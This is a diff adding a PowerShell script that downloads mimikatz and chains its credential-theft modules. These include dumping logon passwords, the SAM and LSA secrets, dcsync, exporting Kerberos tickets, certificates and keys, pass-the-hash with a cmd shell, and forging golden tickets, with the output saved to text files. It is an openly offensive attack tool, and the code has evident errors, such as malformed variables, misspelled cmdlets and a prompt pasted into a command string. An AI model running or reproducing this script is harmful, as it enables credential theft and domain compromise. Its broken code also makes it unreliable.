@@ -1,0 +1,239 @@
+$yourdir= Read-Host -Prompt "Enter the name of your current directory: "
+
+$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.3.0/mimikatz_trunk.zip"
+$file = "mimikatz.zip"
+$MimiDir = "$yourdir"
+
+Invoke-WebRequest $url -OutFile $file
+
+if (!(Test-Path -Path $MimiDir -PathType Container)) {
+  New-Item -ItemType Directory -Path $MimiDir
+}
+
+Expand-Archive -Path $file -DestinationPath $MimiDir -Force
+
+Get-ChildItem $MimiDir
+
+
+$sekurlsaDirectory = "./sekurlsa"
+$kerberosDirectory = "./kerberos"
+$cryptoDirectory = "./crypto"
+$lsadumpDirectory = "./lsadump"
+$pthDirectory = "./pth"
+$ekeysDirectory = "./ekeys"
+$dpapiDirectory = "./dpapi"
+$minidumpDirectory = "./minidump"
+$pttDirectory = "./ptt"
+$GoldenSilverDirectory = "./GoldenSilver"
+$TGTDirectory = "./TGT"
+$PurgeDirectory = "./Purge"
+
+
+if (!(Test-Path -Path $sekurlsaDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $sekurlsaDirectory
+}
+
+$logonpasswords = Join-Path $sekurlsaDirectory "logonpasswords.txt"
+$logonPasswordsfull = Join-Path $sekurlsaDirectory "logonPasswordsfull.txt"
+$tickets_export = Join-Path $sekurlsaDirectory "tickets_export.txt"
+$misc.txt = Join-Path $sekurlsaDirectory "misc.txt"
+
+Start-Process mimikatz.exe "sekurlsa::logonpasswords" -NoNewWindow -Wait `
+  -RedirectStandardOutput $logonpasswords
+Start-Process mimikatz.exe "sekurlsa::logonPasswords full" -NoNewWindow -Wait `
+  -RedirectStandardOutput $logonpasswordsfull
+Start-Process mimikatz.exe "sekurlsa::tickets /export" -NoNewWindow -Wait `
+  -RedirectStandardOutput $tickets_export
+
+$ntlm1 = Read-Host -Prompt "Enter the NTLM of this hash: "
+$user = Read-Host -Prompt "Enter the username (e.g. Administrateur): "
+
+Start-Process mimikatz.exe "sekurlsa::pth /user:$user /domain:winxp /ntlm:$ntlm1 /run:cmd" -NoNewWindow -Wait `
+  -RedirectStandardOutput $misc.txt
+
+
+if (!(Test-Path -Path $kerberosDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $kerberosDirectory
+}
+
+$listexport = Join-Path $kerberosDirectory "list_export.txt"
+$pttchoco = Join-Path $kerberosDirectory "pttchoco.txt"
+$goldeneye = Join-Path $kerberosDirectory "goldeneye.txt"
+
+$krbtgt = Read-Host -Prompt "Enter the krbtgt to use: "
+$admin1 = Read-Host -Prompt "Enter the name of the adminstrator: "
+$sid1 = Read-Host -Prompt "Enter the SID (e.g. S-1-5-21-130452501-2365100805-3685010670): "
+$domain = Read-Host -Prompt "Enter the domain (e.g. chocolate.local): "
+$user = Read-Host -Prompt "Enter the username (e.g. Administrateur): "
+$ticket = Read-Host -Prompt "Enter the ticket to use: "
+$adminticket = Read-Host -Prompt "Enter the admin ticket to use: "
+
+Start-Process mimikatz.exe "kerberos::list /export" -NoNewWindow -Wait `
+  -RedirectStandardOutput $listexport
+
+Start-Process mimikatz.exe "kerberos::ptt c:\chocolate.kirbi" -NoNewWindow -Wait `
+  -RedirectStandardOutput $pttchoco
+
+Start-Process mimikatz.exe "kerberos::golden /admin:$admin1 /domain:$domain /sid:$sid1 /krbtgt:$krbtgt /ticket:$ticket" -NoNewWindow -Wait `
+  -RedirectStandardOutput $goldeneye
+
+
+if (!(Test-Path -Path $cryptoDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $cryptoDirectory
+}
+
+$capi = Join-Path $cryptoDirectory "capi.txt"
+$cng = Join-Path $cryptoDirectory "cng.txt"
+$certexport = Join-Path $cryptoDirectory "certexport.txt"
+$certexportplus = Join-Path $cryptoDirectory "certexportplus.txt"
+$keysexport = Join-Path $cryptoDirectory "keysexport.txt"
+$keysexportmachina = Join-Path $cryptoDirectory "keysexportmachina.txt"
+
+Start-Process mimikatz.exe "crypto::capi" -NoNewWindow -Wait `
+  -RedirectStandardOutput $capi
+Start-Process mimikatz.exe "crypto::cng" -NoNewWindow -Wait `
+  -RedirectStandardOutput $cng
+Start-Process mimikatz.exe "crypto::certificates /export" -NoNewWindow -Wait `
+  -RedirectStandardOutput $certexport
+Start-Process mimikatz.exe "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE" -NoNewWindow -Wait `
+  -RedirectStandardOutput $certexportplus
+Start-Process mimikatz.exe "crypto::keys /export" -NoNewWindow -Wait `
+  -RedirectStandardOutput $keysexport
+Start-Process mimikatz.exe "crypto::keys /machine /export" -NoNewWindow -Wait `
+  -RedirectStandardOutput $keysexportmachina
+
+
+if (!(Test-Path -Path $lsadumpDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $lsadumpDirectory
+}
+
+$dumpsam = JoinPath $lsadumpDirectory "sam.txt"
+$dumpsecrets = JoinPath $lsadumpDirectory "secrets.txt"
+$dumpcach = JoinPath $lsadumpDirectory "cache.txt"
+$dumpdcsync = JoinPath $lsadumpDirectory "dcsync.txt"
+
+
+Start-Process mimikatz.exe "lsadump::sam" -NoNewWindow -Wait `
+  -RedirectStandardOutput $dumpsam
+Start-Process mimikatz.exe "lsadump::secrets" -NoNewWindow -Wait `
+  -RedirectStandardOutput $dumpsecrets
+Start-Process mimikatz.exe "lsadump::cache" -NoNewWindow -Wait `
+  -RedirectStandardOutput $dumpcach
+Start-Process mimikatz.exe "lsadump::dcsync /user::$user /domain:$domain" -NoNewWindow -Wait `
+  -RedirectStandardOutput $dumpdcsync
+
+if (!(Test-Path -Path $pthDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $pthDirectory
+}
+
+$ntlmonly = JoinPath $pthDirectory "ntlmonl.txt"
+$aesonly = JoinPath $pthDirectory "aesonl.txt"
+$ntlmandaes = JoinPath $pthDirectory "ntlmandaes.txt"
+$runhash = JoinPath $pthDirectory "runhash.txt"
+
+$ntlm2 Read-Host -Prompt "Enter the NTLM of this hash: "
+$aes2561 = Read-Host -Prompt "Enter the AES256 value (e.g. 15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42): "
+
+
+Start-Process mimikatz.exe "sekurlsa::pth /user:$user /domain:$domain /ntlm:$ntlm2" -NoNewWindow -Wait `
+  -RedirectStandardOutput $ntlmonly
+Start-Process mimikatz.exe "sekurlsa::pth /user:$user /domain:$domain /aes256:$aes2561" -NoNewWindow -Wait `
+  -RedirectStandardOutput $aesonly
+Start-Process mimikatz.exe "sekurlsa::pth /user:$user /domain:$domain /ntlm:$ntlm2 /aes256:$aes2561" -NoNewWindow -Wait `
+  -RedirectStandardOutput $ntlmandaes
+Start-Process mimikatz.exe "sekurlsa::pth /user:$user /domain:$domain /ntlm:$ntlm2 /run:cmd.exe" -NoNewWindow -Wait `
+  -RedirectStandardOutput $runhash
+
+if (!(Test-Path -Path $ekeysDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $ekeysDirectory
+}
+
+$ekeys = JoinPath $ekeysDirectory "ekeys.txt"
+
+Start-Process mimikatz.exe "sekurlsa::ekeys" -NoNewWindow -Wait `
+  -RedirectStandardOutput $ekeys
+
+if (!(Test-Path -Path $dpapiDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $dpapiDirectory
+}
+
+$dpapi = JoinPath $dpapiDirectory "dpapi.txt"
+
+Start-Process mimikatz.exe "sekurlsa::dpapi" -NoNewWindow -Wait `
+  -RedirectStandardOutput $dpapi
+
+if (!(Test-Path -Path $minidumpDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $minidumpDirectory
+}
+
+$minidump = JoinPath $minidumpDirectory "minidump.txt"
+
+Start-Process mimikatz.exe "sekurlsa::minidump lsass.dmp" -NoNewWindow -Wait `
+  -RedirectStandardOutput $minidump
+
+if (!(Test-Path -Path $pttDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $pttDirectory
+}
+
+$ptt = JoinPath $pttDirectory "ptt.txt"
+
+Start-Process mimikatz.exe "kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi" -NoNewWindow -Wait `
+  -RedirectStandardOutput $ptt
+
+if (!(Test-Path -Path $GoldenSilverDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $GoldenSilverDirectory
+}
+
+
+$sendit1 = JoinPath $GoldenSilverDirectory "sendit1.txt"
+$sendit2 = JoinPath $GoldenSilverDirectory "sendit2.txt"
+$sendit3 = JoinPath $GoldenSilverDirectory "sendit3.txt"
+
+$aes2562 = Read-Host -Prompt "Enter the AES256 value (e.g. 15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42): "
+$admin2 = Read-Host -Prompt "Enter the name of the adminstrator: "
+$user = Read-Host -Prompt "Enter the username (e.g. Administrateur): "
+$sid2 = Read-Host -Prompt "Enter the SID (e.g. S-1-5-21-130452501-2365100805-3685010670): "
+$krbtgt2 = Read-Host -Prompt "Enter the krbtgt to use: "
+
+
+
+Start-Process mimikatz.exe "kerberos::golden /user:$user /domain:$domain /sid:$sid2 /krbtgt:$krbtgt2 /id:1107 /groups:513 /ticket:$ticket" -NoNewWindow -Wait `
+  -RedirectStandardOutput $sendit1
+Start-Process mimikatz.exe "kerberos::golden /domain:$domain /sid:$sid2 /aes256:$aes2562 /user:$user /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080" -NoNewWindow -Wait `
+  -RedirectStandardOutput $sendit2
+Start-Process mimikatz.exe "kerberos::golden /admin:$admin2 = Read-Host -Prompt "Enter the name of the adminstrator:  /domain:$domain /sid:$sid2 /krbtgt:$krbtgt2 /ticket:$adminticket" -NoNewWindow -Wait `
+  -RedirectStandardOutput $sendit3
+
+if (!(Test-Path -Path $TGTDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $TGTDirectory
+}
+
+
+$TGT = JoinPath $TGTDirectory "TGT.txt"
+
+Start-Process mimikatz.exe "kerberos::tgt" -NoNewWindow -Wait `
+  -RedirectStandardOutput $TGT
+
+
+if (!(Test-Path -Path $PurgeDirectory -PathType Container)) {
+  New-Item -ItemType Directory -Path $PurgeDirectory
+}
+
+
+$PurgeIt = JoinPath $PurgeDirectory "Purge.txt"
+
+Start-Process mimikatz.exe "kerberos::purge" -NoNewWindow -Wait `
+  -RedirectStandardOutput $PurgeIt
+
+
+$Curdir = "Enter Your Current Directory: "
+Write-Host "Output directories:"
+Get-ChildItem $Curdir | Select-Object -Index 0..9 | 
+  ForEach-Object {Write-Host "$($_.Name) - press [$($_.Name)] to view all text files"}
+
+$selectedDirectory = Read-Host -Prompt "Enter the number of the directory you want to view: "
+
+$selectedPath = Join-Path $outputDirectory $selectedDirectory
+
+Get-ChildItem $selectedPath -Filter "*.txt" | 
+  ForEach-Object {Start-Process $_.FullName}
